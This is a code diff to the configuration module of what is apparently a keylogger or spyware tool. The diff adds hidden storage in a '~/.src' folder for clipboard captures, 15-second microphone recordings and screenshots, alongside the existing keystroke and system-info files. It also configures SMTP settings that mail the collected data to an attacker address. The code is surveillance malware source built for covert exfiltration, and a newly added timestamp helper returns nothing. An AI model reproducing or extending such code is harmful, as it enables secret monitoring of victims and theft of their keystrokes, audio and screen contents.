@@ -3,9 +3,27 @@ from os.path import expanduser
 from os import makedirs
 import subprocess
 from pathlib import Path
+import time
 
 usr = expanduser("~")
 usr_src = Path(usr, '.src')
+
+def __get_timestamp__():
+    """
+
+    Returns a local timestamp when called.
+
+    Note:
+        This is not future-proof
+
+    Returns:
+        str: A string containing the local time, formatted.
+
+    """
+    t = time.localtime()
+    current_time = time.strftime("%H:%M:%S", t)
+
+    return
 
 
 class Config(ConfigParser):
@@ -29,23 +47,35 @@ class Config(ConfigParser):
 
     def first_write(self):
         file_name = 'keys.txt'
-        conf_file_name = 'keys.conf'
-        sysinfo_file_name = 'sysinfo.txt'
+        conf_fn = 'keys.conf'
+        sysinfo_fn = 'sysinfo.txt'
+        clipboard_fn = 'clip.txt'
+        audio_fn = 'audio.wav'
+        ss_fn = 'ss.png'
 
         makedirs(usr_src, exist_ok=True)
 
         key_filepath = Path(usr_src, file_name)
-        conf_filepath = Path(usr_src, conf_file_name)
-        sysinfo_filepath = Path(usr_src, sysinfo_file_name)
+        conf_filepath = Path(usr_src, conf_fn)
+        sysinfo_filepath = Path(usr_src, sysinfo_fn)
+        clipboard_filepath = Path(usr_src, clipboard_fn)
+        audio_fp = Path(usr_src, audio_fn)
+        ss_fp = Path(usr_src, ss_fn)
 
-        data_files = [key_filepath, conf_filepath, sysinfo_filepath]
+        data_files = [key_filepath, conf_filepath, sysinfo_filepath, clipboard_filepath]
 
         self.place_and_hide(data_files)
 
         defaults = {
             'FILES': {
                 'key-store': key_filepath,
-                'sysinfo-store': sysinfo_filepath
+                'sysinfo-store': sysinfo_filepath,
+                'clipboard-store': clipboard_filepath,
+                'audio-store': audio_fp,
+                'ss-store': ss_fp
+            },
+            'MIC': {
+                'duration': 15,
             },
             'SENDMAIL.PARTIES': {
                 'dest': '133754X0R@fakemail.com',
@@ -58,6 +88,9 @@ class Config(ConfigParser):
             'SENDMAIL.AUTH': {
                 'login': 'hax0r@fakemail.com',
                 'password': '1234'
+            },
+            'GENERAL': {
+
             }
 
         }
